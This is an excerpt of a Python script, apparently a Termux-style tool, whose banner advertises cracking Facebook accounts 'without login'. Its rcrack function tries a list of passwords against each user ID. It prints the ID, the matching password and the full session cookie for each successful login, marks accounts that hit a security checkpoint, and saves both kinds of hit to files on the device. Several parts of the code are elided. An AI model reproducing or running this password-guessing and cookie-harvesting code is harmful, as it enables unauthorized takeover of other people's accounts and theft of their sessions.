...
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
\033[1;97m===============================================================
\033[1;37m[-] AUTHOR    :\033[1;32m Aman Khan
\033[1;37m[-] TOOL TYPE :\033[1;32m FREE
\033[1;37m[-] TOOLS      :\033[1;32m CRACK FACEBOOK WITHOUT LOGIN
\033[1;37m[-] VERSION    :\033[1;32m v.7
\033[1;37m[-] GITHUB     :\033[1;32m Hacker-raj1
\033[1;37m[-] FACEBOOK  :\033[1;32m sorry1314
\033[1;97m===============================================================""")
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mAmaN🔥\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[AmaN-OK] {cid} | {ps}")
                print(f"\033[1;97m[\033[1;91mCOOKIE\033[1;97m][👉] :\033[1;92m {coki}")
                #print(f'{B}User Agent--> {pro} \n')
                open('/sdcard/AmaN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"\x1b[38;5;196m[AmaN-CP] {cid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/AmaN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[AmaN🔥] [%s/%s]  \033[1;92mOK\033[1;97m|  \r'%(loop,tl,len(oks))),
